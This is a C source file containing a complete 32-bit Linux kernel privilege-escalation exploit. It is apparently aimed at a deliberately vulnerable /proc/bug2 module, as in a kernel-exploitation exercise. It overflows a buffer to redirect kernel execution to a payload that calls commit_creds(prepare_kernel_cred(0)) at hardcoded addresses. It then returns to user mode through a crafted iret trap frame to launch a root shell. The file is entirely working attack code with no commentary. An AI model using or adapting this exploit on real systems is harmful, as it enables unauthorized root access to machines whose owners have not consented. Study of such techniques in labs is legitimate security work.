#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

struct trap_frame
{
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
}__attribute__((packed));

struct trap_frame tf;

void launch_shell(void)
{
    execl("/bin/sh", "sh", NULL);
}

void prepare_tf(void)
{
    asm("pushl %cs; popl tf + 4;" 
        "pushfl; popl tf + 8;"  
        "pushl %esp; popl tf + 12;"
        "pushl %ss; popl tf + 16;");
    tf.eip = launch_shell;
    tf.esp -= 1024; //unused part of stack
}

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xc016b2f0;
void (*commit_creds)(void*) KERNCALL = (void*) 0xc016afb0;

void payload(void)
{  
    commit_creds(prepare_kernel_cred(0));
    asm("mov $tf, %esp;"
       "iret;");
}
int main(void)
{
    char buf[24];
    *((void**)(buf + 20)) = payload; 
    prepare_tf();

    int fd = open("/proc/bug2", O_WRONLY);
    
    write(fd,buf,sizeof(buf));
    return 0;
}
